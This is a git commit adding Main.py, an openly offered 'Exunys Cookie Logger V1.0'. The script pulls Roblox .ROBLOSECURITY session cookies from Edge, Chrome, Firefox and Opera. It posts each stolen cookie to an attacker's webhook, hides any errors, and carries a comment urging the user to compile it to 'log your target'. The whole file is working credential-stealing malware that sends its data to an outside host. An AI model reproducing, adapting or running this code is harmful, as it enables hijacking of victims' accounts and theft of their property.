6bccd8a48f790ffb7b9ea89d79e9f316e5569205
Exunys <76539058+Exunys@users.noreply.github.com>
2022-02-17 23:08:58 +0100

    V1.0 First & Last Release

---
+++ Main.py
@@ -0,0 +1,44 @@
+import browser_cookie3, requests, threading
+
+WebHook = "INPUT_HERE" # Input your webhook here and make sure to compile if you want to log your target
+
+def MicrosoftEdge():
+    try:
+        cookies = browser_cookie3.edge(domain_name = "roblox.com")
+        cookies = str(cookies)
+        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
+        requests.post(WebHook, json = {"username" : "Exunys Cookie Logger V1.0", "content" : f"```{cookie}```"})
+    except:
+        pass
+
+def GoogleChrome():
+    try:
+        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
+        cookies = str(cookies)
+        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
+        requests.post(WebHook, json = {"username" : "Exunys Cookie Logger V1.0", "content" : f"```{cookie}```"})
+    except:
+        pass
+
+def MozillaFirefox():
+    try:
+        cookies = browser_cookie3.firefox(domain_name = "roblox.com")
+        cookies = str(cookies)
+        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
+        requests.post(WebHook, json = {"username" : "Exunys Cookie Logger V1.0", "content" : f"```{cookie}```"})
+    except:
+        pass
+
+def Opera():
+    try:
+        cookies = browser_cookie3.opera(domain_name = "roblox.com")
+        cookies = str(cookies)
+        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
+        requests.post(WebHook, json = {"username" : "Exunys Cookie Logger V1.0", "content" : f"```{cookie}```"})
+    except:
+        pass
+
+browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]
+
+for v in browsers:
+    threading.Thread(target = v).start()
